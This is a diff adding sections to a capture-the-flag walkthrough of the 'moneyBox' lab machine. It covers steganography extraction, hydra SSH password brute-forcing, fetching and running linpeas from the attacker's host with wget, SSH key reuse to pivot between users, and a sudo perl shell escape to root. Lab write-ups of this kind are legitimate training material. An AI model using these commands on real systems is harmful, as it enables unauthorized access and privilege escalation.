@@ -60,16 +60,67 @@ this page also had this `<!..Secret Key 3xtr4ctd4t4 >` hidden in its source code
 
 
 ## Initial Access
+Since this box is a CTF-like Box, and after our enumeration we did find a JPG image and a key `3xtr4ctd4t4`, we will try some steganography on this image, since it is JPG image, we can use steghide and since we have a key, we can try that key as passphrase to stehide
+```bash
+steghide extract -sf trytofind.jpg
+```
+
+![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/5dc2c4f8-3499-4f5c-8391-318cc786abc8)
+
+This hint indicats that the password of the user `renu` is easy to brute force, we can use hydra to bruteforce it on the service SSH
+```bash
+hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://[IP-ADDRESS] -t 10
+```
 
 
+![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/5478486f-358b-43c8-95d0-8a4c4a539f58)
 
+We found quickly this easy password : `987654321`
 
-
-
+![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/29705a8a-5eb8-4250-9623-f633435773e7)
 
 ## Privilege Escalation
 
+After gaining access to the moneyBox machine as renu user, we will try to escalate our privileges, to do so, we run linpeas on the target machine, 
 
+in my kali machine :
+```bash
+python3 -m http.server 80
+```
+
+in the moneyBox machine 
+```bash
+cd /tmp
+wget http://[IP-ADDRESS-kali]/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+After going through the output of linpeas we get some intresting commands that were related to ssh and the user lily
+
+
+![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/dedad9c9-8105-4872-a408-c139722638e8)
+
+we make sure we can access access ssh using the user lily, i checked the file authorized keys in the .ssh directory inside the home directory of renu 
+and i found that lily can access ssh using the same private key that renu uses :
+
+
+![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/b2724f9c-1100-4300-a340-a39b6c011b5f)
+
+doing so i got a access with priviliges of the user lily, 
+
+
+![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/ad9026e8-0fd7-462e-865e-d01d0fda4fd1)
+
+running the command `sudo -l` shows that i can run the command perl with sudo permissions without password, using the {GTFObins](https://gtfobins.github.io/gtfobins/perl/#sudo) website i can run this command to get root privileges :
+
+```bash
+sudo perl -e 'exec "/bin/sh";'
+```
+
+And Yes we are again GROOT!!!
+
+![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/4e6dfdb9-2751-4bf1-b123-69118b492e76)
 
 
 
